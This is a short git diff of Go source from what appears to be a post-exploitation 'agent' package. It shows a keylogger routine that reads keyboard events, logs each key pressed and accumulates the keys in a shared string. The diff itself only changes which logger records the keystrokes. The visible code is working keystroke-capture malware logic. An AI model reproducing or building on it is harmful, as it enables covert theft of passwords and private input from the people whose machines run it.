@@ -1,10 +1,10 @@
 package agent
 
 import (
-	"log/slog"
 	"sync"
 
 	"github.com/MarinX/keylogger"
+	logger "github.com/hardal7/pex/internal/util"
 )
 
 var mu sync.Mutex
@@ -22,7 +22,7 @@ func LogKeyboard() {
 	for event := range events {
 		if event.Type == keylogger.EvKey {
 			if event.KeyPress() {
-				slog.Info("Key pressed: " + event.KeyString())
+				logger.Debug("Key pressed: " + event.KeyString())
 				mu.Lock()
 				keysPressed += event.KeyString()
 				mu.Unlock()
